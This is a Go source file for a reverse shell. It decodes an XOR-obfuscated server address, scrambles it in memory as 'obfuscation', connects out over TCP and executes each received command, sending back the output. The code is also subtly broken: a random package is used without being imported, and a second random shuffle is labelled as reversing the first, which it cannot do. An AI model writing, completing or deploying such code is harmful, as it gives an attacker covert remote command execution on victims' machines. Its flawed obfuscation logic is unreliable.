package main

import (
    "bufio"
    "fmt"
    "net"
    "os/exec"
    "strings"
)

// XOR Encryption Function
func xorEncryptDecrypt(input, key string) string {
    output := make([]rune, len(input))
    for i, char := range input {
        output[i] = char ^ rune(key[i%len(key)])
    }
    return string(output)
}

// Memory Obfuscation - Bit Manipulation
func manipulateMemory(data []byte) {
    for i := range data {
        data[i] = ^data[i]
    }
}

// Memory Obfuscation - Byte Shuffling
func shuffleMemory(data []byte) {
    for i := len(data) - 1; i > 0; i-- {
        j := rand.Intn(i + 1)
        data[i], data[j] = data[j], data[i]
    }
}

func main() {
    encryptedServer := "\x12\x34\x56\x78\x9A\xBC\xDE\xF0" // Placeholder encrypted server
    key := "ComplexKey" // More complex key

    server := xorEncryptDecrypt(encryptedServer, key)

    serverBytes := []byte(server)
    manipulateMemory(serverBytes) // Memory obfuscation
    shuffleMemory(serverBytes) // Additional memory obfuscation

    shuffleMemory(serverBytes) // Reverse shuffling
    manipulateMemory(serverBytes) // Reverse bit flipping

    conn, err := net.Dial("tcp", string(serverBytes))
    if err != nil {
        fmt.Println(err)
        return
    }
    for {
        message, _ := bufio.NewReader(conn).ReadString('\n')

        // Executing received command
        cmdOutput, err := exec.Command(strings.TrimSpace(message)).Output()
        if err != nil {
            fmt.Fprintf(conn, "%s\n", err)
        } else {
            fmt.Fprintf(conn, "%s\n", cmdOutput)
        }
    }
}

